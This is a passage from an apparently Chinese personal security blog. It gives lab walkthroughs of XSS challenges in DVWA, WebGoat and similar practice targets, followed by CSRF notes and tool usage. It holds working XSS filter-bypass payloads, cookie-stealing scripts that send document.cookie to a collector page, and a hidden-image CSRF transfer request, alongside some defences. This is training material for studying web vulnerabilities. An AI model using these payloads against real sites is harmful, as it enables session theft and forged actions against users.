src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop~31370AWY0@A%5D%%5BZYLQ8I%5BI.png" alt=""></p><p>直接使用<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>尝试，发现成功弹窗。</p><img src="C:\Users\尚慧亮\Desktop\QQ截图20200112112615.png" style="zoom: 33%;" /><p>分析源码：</p><img src="C:\Users\尚慧亮\Desktop\5M26R`@5UXK[OQGO{ZMHYD2.png" style="zoom: 50%;" /><p>代码只判断了name值是否为空。没有做任何过滤。</p><p><strong>尝试盗取cookie:</strong></p><p>在本地网站根目录新建cookie.php和cookie.txt。</p><p>cookie.php内容为</p><img src="C:\Users\尚慧亮\Desktop\QQ截图20200112124443.png" style="zoom: 50%;" /><p>回到dvwa中构造攻击语句：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>document<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">'http://127.0.0.1/cookie.php?cookie='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>得到cookie:</p><img src="C:\Users\尚慧亮\Desktop\QQ截图20200112124855.png" style="zoom:33%;" /><p>回到DVWA的登录界面：</p><p>在火狐浏览器的控制台中编辑cookie重新发包：</p><img src="C:\Users\尚慧亮\Desktop\QQ截图20200112125154.png" style="zoom:50%;" /><p>访问index.php发现成功以被攻击者身份登录。</p><p><strong>medium:</strong></p><p>首先尝试<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>  发现<script>标签被过滤。</p><p>分析源码：</p><p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112114020.png" alt=""></p><p>代码使用 "str_replace"函数将<script>标签替换为空，且该函数是大小写敏感。我们可以采用多种方式绕过。</p><p>1.大小写绕过：<SCRIPT>alert(1)</SCRIPT></p><p>2.双写绕过：&lt;<script>script>alert(1)<</script>/script&gt;</p><p>3.利用img标签进行绕过：<code>&lt;img src=1 onerror=alert(1)&gt;</code></p><p> <strong>PS:  onerror事件会在文档或图像加载过程中发生错误时被触发</strong></p><p>  <strong>因为src=x就是一个错误代码，所以触发事件执行</strong></p><p><strong>high</strong>:</p><p>尝试<script>alert(1)</script> 无效。</p><p>再次尝试<code>&lt;img src=1 onerror=alert(1)&gt;</code>  成功。</p><p>同样可以使用：<code>&lt;iframe onload=alert(1)&gt;</code></p><p><strong>PS:<iframe>标签可以在一个html代码中嵌入另一个html内容</strong></p><p>​      <strong>onload 是js的一个事件，事件会在页面加载完成后，立即发生，同时执行被调用的程序。</strong></p><img src="C:\Users\尚慧亮\Desktop\QQ截图20200112114820.png" style="zoom:33%;" /><p>分析源码：</p><p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112115042.png" alt=""></p><p><strong>impossible:</strong></p><p>尝试<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>发现语句被原封不动输出。</p><p>查看后台代码：</p><img src="C:\Users\尚慧亮\Desktop\QQ截图20200112130818.png" style="zoom: 50%;" /><p>引用博客大佬解释：</p><p>利用PHP函数<code>htmlspecialchars()</code>实现将特殊字符（逻辑与符号<code>&amp;</code>、双引号<code>&quot;</code>、单引号<code>&#39;</code>、小于号<code>&lt;</code>、大于号<code>&gt;</code>）转换为 HTML 实体，从而使得浏览器不解析其作为html元素构造脚本来执行，只是作为普通输入的字符来显示。</p><img src="C:\Users\尚慧亮\Desktop\QQ截图20200112141718.png" style="zoom: 67%;" /><h4 id="XSS-DOM"><a href="#XSS-DOM" class="headerlink" title="XSS DOM"></a>XSS DOM</h4><p><strong>DOM xss产生的原因：</strong></p><p>​         DOM—based XSS漏洞是基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM—based XSS漏洞<br><strong>常用 xss DOM属性：</strong></p><p>document.referer</p><p>window.name</p><p>location</p><p>innerHTML</p><p>document.write</p><p>simple:</p><p>查看后台代码：</p><p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112131409.png" alt="">  </p><p> 什么都没有做。。。</p><p>随便选择一种语言：</p><p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112132346.png" alt=""></p><p>我们可以在之后接入我们想要执行的代码：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p>成功弹窗：</p><img src="C:\Users\尚慧亮\Desktop\QQ截图20200112132515.png" style="zoom:33%;" /><p> 火狐查看页面元素：</p><p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112132558.png" alt=""></p><p><strong>medium:</strong></p><p>查看后台代码：</p><img src="C:\Users\尚慧亮\Desktop\QQ截图20200112133547.png" style="zoom: 50%;" /><p>代码使用了stripos函数过滤了<strong>&lt;script</strong>.并且不区分大小写。</p><p>我们可以使用<code>&lt;img src=1 onerror=1&gt;</code>绕过</p><p>我们查看页面源码：</p><option value='    "+lang+"      '> "  +decodeURl(lang) +  " </option><p>我们的目的是让语句插入option标签的值中进而执行。</p><p>直接插入：</p><p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112134126.png" alt=""></p><p>尝试闭合前面<option><select>标签</p><p>插入 <code>&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(1)&gt;</code>成功</p><img src="C:\Users\尚慧亮\Desktop\QQ截图20200112134639.png" style="zoom:33%;" /><p><strong>high:</strong></p><p>查看后台代码</p><img src="C:\Users\尚慧亮\Desktop\QQ截图20200112134821.png" style="zoom: 67%;" /><p>白名单过滤，只允许传指定的default值。</p><p><strong>补充知识：url中有一个字符为#，该字符后的数据不会发送到服务器端，从而绕过服务端过滤</strong></p><p>构造攻击代码：</p><p><code>?default=English #&lt;script&gt;alert(1)&lt;/script&gt;</code></p><img src="C:\Users\尚慧亮\Desktop\QQ截图20200112140826.png" style="zoom: 33%;" /><p><strong>impossible:</strong></p><p>后台代码:</p><img src="C:\Users\尚慧亮\Desktop\QQ截图20200112141157.png" style="zoom: 50%;" /><p>注释里说保护的代码在客户端的里面。</p><p>我们尝试构造语句<script>alert(1)</script>发现没有任何反应。</p><p>我们查看源代码：</p><img src="C:\Users\尚慧亮\Desktop\QQ截图20200112141405.png" style="zoom: 80%;" /><p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112141418.png" alt=""></p><p>发现这里对我们输入的参数并没有进行URL解码，所以我们输入的任何参数都是经过URL编码，然后直接赋值给option标签。所以，就不存在XSS漏洞了。</p><h4 id="XSS-stored"><a href="#XSS-stored" class="headerlink" title="XSS (stored)"></a>XSS (stored)</h4><p><strong>simple:</strong></p><img src="C:\Users\尚慧亮\Desktop\QQ截图20200112142234.png" style="zoom:33%;" /><p>出现一个留言框，直接在name中输入发现有字数限制，</p><p>直接使用火狐对页面元素进行修改。修改maxlength</p><p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112142128.png" alt=""></p><p>或者使用burp抓包绕过前端限制。</p><p><strong>medium:</strong></p><p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112142934.png" alt=""></p><p>str_replace():含有“<script>”的字符串替换为空</p><p>addslshes():函数返回在预定义字符之前添加反斜杠的字符串。</p><p>htmlspecialchars():函数把预定义的字符转换为HTML实体。</p><p>message防注入基本天衣无缝。。。。。</p><p>但是我们仍然可以通过name栏进行注入。</p><p>构造攻击语句：</p><p><code>&lt;Script&gt;document.location=&#39;http://127.0.0.1/1.php?cookie=&#39;+document.cookie;&lt;/script&gt;</code></p><h3 id="Webgoat-靶场-xss-部分"><a href="#Webgoat-靶场-xss-部分" class="headerlink" title="Webgoat 靶场 xss(部分)"></a>Webgoat 靶场 xss(部分)</h3><p><strong>stage 1: strored XSS</strong></p><ol><li>作为Tom，在个人简介编辑页执行存储型XSS攻击，验证Jerry会受到攻击影响。</li><li>使用Tom登录，修改Tom的个人简介编辑页的街道一栏，在其后添加,更新个人信息</li></ol><img src="C:\Users\尚慧亮\Desktop\QQ截图20200112164709.png" style="zoom: 50%;" /><p>3.使用Jerry登录，选择Tom的个人信息进行查看，弹窗表明存储型XSS攻击成功。</p><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112164941.png" style="zoom:50%;" /><p><strong>Stage3:Stored XSS Revisited</strong></p><p>验证Bruce的个人简历中包含有XSS攻击，使用David用户登录，查看Bruce的个人简介，出现弹窗，表明存在XSS攻击。</p><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112165159.png" style="zoom:50%;" /><p><strong>Stage5:Reflected XSS</strong></p><p>1.利用查找职工页面的缺陷制作一个包含有反射型XSS的URL，验证其他使用这个链接的用户也会受到攻击影响。</p><p>2.使用用户Larry登录，在Search Staff搜索框中输入恶意代码。</p><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112170452.png" style="zoom: 50%;" /><p>使用tom登录查看搜素界面无法正常显示：</p><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112170527.png" style="zoom:50%;" /><h5 id="Stored-XSS-Attacks"><a href="#Stored-XSS-Attacks" class="headerlink" title="Stored XSS Attacks"></a><strong>Stored XSS Attacks</strong></h5><p>清除所有的输入是一个很好的选择，尤其是清除那些将被用作参数使用的输入。对于在应用程序中永久存储的内容特别重要。当用户的消息被检索时，不能出现不期望的消息内容。</p><p>在输入的内容中添加javascript代码，点击Submit按钮。</p><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112171509.png" style="zoom:50%;" /><p>点击我们刚刚创建好的帖子，触发xss</p><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112171526.png" style="zoom:50%;" /><h5 id="Reflected-XSS-Attacks"><a href="#Reflected-XSS-Attacks" class="headerlink" title="Reflected XSS Attacks"></a>Reflected XSS Attacks</h5><p> 在服务器端验证所有输入是一个很好的选择。未验证的用户输入可能会在HTTP响应中出现XSS。攻击者可以创建一个URL，通过让受害者点击的方式进行XSS攻击。</p><p>在digit access code框中添加攻击代码：</p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112172146.png)0</p><p><strong>Cross Site Request Forgery (CSRF)</strong></p><p>​       在这一课中，您的目的是向一个新闻组发送一封邮件，邮件中包含一张图片，这个图像 的URL指向一个恶意请求。尝试一个包括1*1像素的图像，其中包含一个网址。这个URL 应当用一个额外的参数“transferFunds= 4000”指向CRSF课程页面。您可以通过左侧菜单在 CSRF课程连接上右键单击，选择复制快捷方式。无论谁收到这封邮件，并恰好已经通过身份验证，他的资金将会被转走。 <br>    注意:不同WebGoat环境的 URL中“Screen”和“Menu”参数可能会有所区别。注意使 用您但前访问URL中正在使用的参数。  </p><p>我们需要创建一个图片，链接到一个网站，格式如下：</p><p><code>&lt;img src=&quot;http://192.168.1.149/WebGoat/attack?Screen=52&amp;menu=900&amp;transferFunds=5000&quot; width=&quot;1&quot;height=&quot;1&quot;/&gt;</code></p><p>创建后提交</p><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112173529.png" style="zoom:50%;" /><p>点击刷新即可通关。</p><h3 id="XSS——alert-1-to-win"><a href="#XSS——alert-1-to-win" class="headerlink" title="XSS——alert(1)to win"></a>XSS——alert(1)to win</h3><p><strong>Warmup</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">escape</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token string">'&lt;script>console.log("'</span> <span class="token operator">+</span> s <span class="token operator">+</span> <span class="token string">'");&lt;/script>'</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>代码直接拼接了输入的字符串，没有进行任何有效的过滤，我们尝试闭合即可。</p><p>")闭合前面的双引号和括号，后面使用// 或<!--注释“</p><p>尝试：<code>&quot;);alert(1) //</code>成功</p><p>也可以闭合前面的<script>标签</p><p>尝试:<code>&lt;/script&gt;;&lt;script&gt;alert(1)&lt;!--</code>成功</p><p><strong>Adobe</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">escape</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>    s <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token string">"/g, '\\"</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">'&lt;script>console.log("'</span> <span class="token operator">+</span> s <span class="token operator">+</span> <span class="token string">'");&lt;/script>'</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>代码将输入的双引号用\进行了转义，所以无法通过进行双引号的闭合。</p><p>但我们还可以通过<script>标签闭合绕过。</p><p>或者在输入的双引号前在加一个\对转义双引号的\进行转义。如下：</p><p>尝试<code>\&quot;);alert(1)//</code></p><p><strong>JSON</strong></p><pre><code>function escape(s) {  s = JSON.stringify(s);  return &#39;&lt;script&gt;console.log(&#39; + s + &#39;);&lt;/script&gt;&#39;;}</code></pre><p>JSON 通常用于与服务端交换数据。</p><p>在向服务器发送数据时一般是字符串。</p><p>我们可以使用 JSON.stringify() 方法将 JavaScript 对象转换为字符串。</p><p>过滤了,"等字符。</p><p>尝试<code>&lt;/script&gt;&lt;script&gt;alert(1)//</code>成功</p><p><strong>Markdown</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">escape</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> text <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/&lt;/g</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/"/g</span><span class="token punctuation">,</span> <span class="token string">'&amp;quot;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// URLs</span>    text <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/(http:\/\/\S+)/g</span><span class="token punctuation">,</span> <span class="token string">'&lt;a href="$1">$1&lt;/a>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// [[img123|Description]]</span>    text <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\[\[(\w+)\|(.+?)\]\]/g</span><span class="token punctuation">,</span> <span class="token string">'&lt;img alt="$2" src="$1.gif">'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> text<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>s.replace将<strong>< "</strong>转换成立HTML实体</p><p>text.replace意思为判断输入中是否含有http://,如果有就生成一个a标签,</p><p>第三波，如果字符串包含<code>[[img_src|img_alt]]</code>格式的字符串，则变为</p><p><code>&lt;img alt=&quot;img_alt&quot; src=&quot;img_src.gif&quot;&gt;</code></p><p><strong>Fruit</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// CVE-2016-4618</span><span class="token keyword">function</span> <span class="token function">escape</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> div <span class="token operator">=</span> document<span class="token punctuation">.</span>implementation<span class="token punctuation">.</span><span class="token function">createHTMLDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  div<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> s<span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'SCRIPT'</span> <span class="token operator">===</span> n<span class="token punctuation">.</span>tagName<span class="token punctuation">)</span> n<span class="token punctuation">.</span>parentNode<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>n<span class="token punctuation">.</span>attributes<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">var</span> name <span class="token operator">=</span> n<span class="token punctuation">.</span>attributes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>name <span class="token operator">!==</span> <span class="token string">'class'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> n<span class="token punctuation">.</span><span class="token function">removeAttribute</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>div<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> div<span class="token punctuation">.</span>innerHTML<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>代码给出了漏洞编号,查了一下得知；</p><p>问题来源于代码的逻辑不严谨，在<code>for</code>循环中，代码通过<code>n.attributes.length</code>来判断边界条件，但是<code>n.attributes.length</code>是动态变化的，如果存在多个属性，则最后一个属性是无法删除的，只要我们构造多个属性即可。</p><p><code>&lt;iframe t onload=alert(1)&gt;</code></p><h3 id="小迪XSS靶场"><a href="#小迪XSS靶场" class="headerlink" title="小迪XSS靶场"></a>小迪XSS靶场</h3><h5 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h5><p>我们需要闭合前面的文本标签</p><p><code>&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200201205424.png" style="zoom:50%;" /><h5 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h5><p>过滤了圆括号(),但是我们仍然可以使用反引号执行.</p><p><code>&lt;script&gt;alert</code>1<code>&lt;/script&gt;</code></p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120202706.png)</p><h5 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h5><p>过滤了圆括号（）  反引号 `<br> 用<svg>标签中可以直接执行实体字符</p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120203328.png)</p><h5 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h5><p>这里使用!-->闭合</p><p><code>!--&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120203548.png)</p><h5 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h5><p>​        过滤以auto开头或者on开头，=等号结尾的标签属性并替换成下划线_ , 且忽略大小写，虽然看起来好像无解了。但是这里我们可以通过换行来绕过正则的检查，看源码写的type=“text”<br> 是文本格式无法执行，我们用type=“image”绕过 </p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120204137.png)</p><h5 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h5><p>\w+:多个 英文字母或数字或下划线组成的<br> /?: 0个或1个/<br> g: 全局匹配<br> i: 不区分大小写</p><p>这里过滤了<多个字母或数字> 也就是说 <a>, </a> <111> 全部替换成空，可以用低优先级来解决去掉末尾的></p><pre><code>&lt;body onload=&quot;alert(1)&quot;</code></pre><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120204654.png)</p><h5 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h5><p>​      代码中将</style>标签替换成/ u574Fu4EBA /，且忽略大小写；正则的目的在于防止我们闭合<style>标签，但是这里我们依然可以通过换行绕过正则进行闭合。</p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120204809.png)</p><h5 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h5><p>代码要求我们以<a href="https://www.segmentfault.com开头，输入点是在" target="_blank" rel="noopener">https://www.segmentfault.com开头，输入点是在</a><>标签中，我们可以用</script>闭合前面 在后面加注释绕过</p><p><code>https://www.segmentfault.com&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;//</code></p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120205401.png)</p>]]></content>
      
      
      <categories>
          
          <category> web漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF+SSRF漏洞学习</title>
      <link href="/2020/04/03/csrf-lou-dong-xue-xi/"/>
      <url>/2020/04/03/csrf-lou-dong-xue-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="CSRF漏洞-SSRF漏洞笔记-靶场实战"><a href="#CSRF漏洞-SSRF漏洞笔记-靶场实战" class="headerlink" title="CSRF漏洞+SSRF漏洞笔记+靶场实战"></a>CSRF漏洞+SSRF漏洞笔记+靶场实战</h2><h3 id="CSRF漏洞部分"><a href="#CSRF漏洞部分" class="headerlink" title="CSRF漏洞部分"></a>CSRF漏洞部分</h3><h4 id="CSRF简述"><a href="#CSRF简述" class="headerlink" title="CSRF简述"></a>CSRF简述</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>​    CSRF攻击建立在浏览器和Web服务器的对话之中，并且能欺骗用户访问url，发起的目标是通过伪造的用户请求，该请求不是用户想发出去的请求，对服务器或服务来说，该请求是完全合法的请求，但却完成了攻击者的期望操作。</p><p>​    从代码上看，CSRF能攻击成功是攻击者猜到了你重要参数，因而伪造请求。</p><p>​    可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义进行某些非法操作。CSRF能够使用你的账户发送邮件，获取你的敏感信息，甚至盗走你的账户</p><p><strong>浏览器Cookie机制：</strong></p><p>cookie的两种表现形式：一种是本地Cookie，又称持久性Cookie；</p><p>　　　　　　　　　　  一种是临时Cookie，又称Session Cookie；：</p><h5 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h5><p>1.攻击者必须在目标站点找到一个表单的提交入口，或者有类似的URL(例如用来转钱，修改受害者邮箱或者密码)</p><p>2.目标站点不能有检测referer头操作，或者被攻击者的浏览器允许referer欺骗</p><p>3.攻击者必须了解表单或者URL参数中的正确的值，如果有秘密验证值或者ID，攻击者没有猜对，攻击者很可能不成功。</p><p>4。攻击者必须诱使受害者访问有恶意代码的页面，并且此时受害者已经登录到目标站点。</p><h5 id="漏洞利用场景"><a href="#漏洞利用场景" class="headerlink" title="漏洞利用场景"></a>漏洞利用场景</h5><ul><li>有意义的操作（如修改密码）</li><li>验证过于简单（参数固定、我们可以设置参数）</li></ul><p><strong>漏洞类型</strong></p><ul><li>GET型</li><li>POST型</li></ul><h5 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h5><p>1.手工检测：抓包查看是否存在无token无referer验证这种情况。存在的话就会有CSRF漏洞</p><p>​                       如果存在无token有referer验证这种情况时，我们可以尝试空referer绕过或者尝试抓包伪造referer  </p><p>2.半自动检测：常用半自动检测漏洞的软件有CSRFTester,CSRF Request Builder等。</p><h5 id="漏洞挖掘："><a href="#漏洞挖掘：" class="headerlink" title="漏洞挖掘："></a>漏洞挖掘：</h5><p><strong>1、自动化扫描工具</strong></p><p>netspark</p><p>AWVS</p><p>appscan</p><p>一般用上列工具可以扫描到网站是否存在CSRF漏洞。但是在工具中添加登录参数可以大大提高挖掘的成功率</p><p><strong>2、半自动检测工具</strong></p><p>CSRFTester</p><p>下载地址：<a href="https://www.owasp.org/index.php/File:CSRFTester-1.0.zip" target="_blank" rel="noopener">https://www.owasp.org/index.php/File:CSRFTester-1.0.zip</a></p><p>1.安装CSRFTester</p><p><img src="https://www.secpulse.com/wp-content/uploads/2018/11/1.jpg" alt="1.jpg"></p><p>打开run.bat就可以打开工具，但是需要java的环境</p><p><img src="https://www.secpulse.com/wp-content/uploads/2018/11/2-1024x622.jpg" alt="2.jpg">)<img src="https://www.secpulse.com/wp-content/uploads/2018/11/21-1024x622.jpg" alt="2.jpg"></p><p>消息框出现该消息时，表示工具已经开始监听本地8008这个端口了，这个时候需要配置浏览器的代理</p><p>\2. 设置浏览器代理（搜狗浏览器为例）</p><p>点击工具栏–代理设置–添加新代理，将代理进行添加并启用即可</p><p><img src="https://www.secpulse.com/wp-content/uploads/2018/11/3-1024x584.png" alt="3.png"></p><p>\3. 用户登录</p><p>单击“Start Recording”，开启CSRFTester的检测工作，这样以后我们所有访问的URL以及参数都会被记录下来。</p><p>\4. 通过CSRFTester抓取和伪造请求</p><p>当你登录一个网站账号时，CSRF Tester会进行抓取</p><p><img src="https://www.secpulse.com/wp-content/uploads/2018/11/9.png" alt="9.png"></p><p>我们抓取了该请求，在Step属性中添加请求，然后将Form Parameter中的user等表单中参数进行修改，然后单击Generate HTML按钮（可以选择其他格式：Forms、IFrame等）来产生CSRF攻击脚本。</p><p><img src="https://www.secpulse.com/wp-content/uploads/2018/11/10-1024x659.png" alt="10.png"></p><p>随机生成了一个攻击脚本，将其上传服务器，发送给受害者即可。</p><p>CSRF PoC generator</p><p>打开burpsuite，在抓取任意一个HTTP请求中点击右键，选择Engagement tools，然后点击Generate CSRF POC即可生成CSRF POC，</p><p><img src="https://www.secpulse.com/wp-content/uploads/2018/11/8-1024x822.png" alt="8.png">)<img src="https://www.secpulse.com/wp-content/themes/secpulse2017/js/editor/themes/default/images/spacer.gif" alt="img"></p><p>这款工具也是根据请求参数生成的POC，可以直接点击test in browser按钮进行测试，点击后会利用这段POC进行攻击。</p><p>上列两款工具可以拦截所有的请求，渗透测试人员可以在登录状态下进行修改密码、删除文件等操作，工具便会将发送的请求进行拦截，再通过工具生成的POC便可以验证漏洞是否存在。</p><p>1.CSRFTester设置浏览器代理:127.0.0.1:8008，bp是8080</p><p>2.登录web应用程序，提交表单，在CSRF工具中修改表单内容，查看是否更改，如果更改就存在CSRF漏洞</p><p>3.生成POC<br>一个wordpress博客为例就存在一个CSRF漏洞<br>创建用户，bp抓包，修改添加用户的账号密码<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190802112041-81ebadd4-b4d4-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190802112041-81ebadd4-b4d4-1.png" alt="img"></a><br>发送到CSRF POC<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190802112102-8e91ff5c-b4d4-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190802112102-8e91ff5c-b4d4-1.png" alt="img"></a><br>以html形式保存下来，发送给目标用户欺骗他打开，成功创建一个新账户<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190802112122-9a57c2f4-b4d4-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190802112122-9a57c2f4-b4d4-1.png" alt="img"></a></p><h5 id="常见的防御方法："><a href="#常见的防御方法：" class="headerlink" title="常见的防御方法："></a>常见的防御方法：</h5><ul><li><p><strong>使用验证码：</strong></p><p>验证码强制用户必须和应用进行交互，才能完成最终的请求</p></li><li><p><strong>验证HTTP referer字段：</strong></p><p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，会带上Referer，通过验证Referer，可以判断请求的合法性，如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。</p></li><li><p><strong>在请求地址中添加token并验证：</strong></p><p>在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token不正确，则认为可能是CSRF攻击而拒绝该请求。</p></li></ul><h4 id="DVWA（CSRF部分）"><a href="#DVWA（CSRF部分）" class="headerlink" 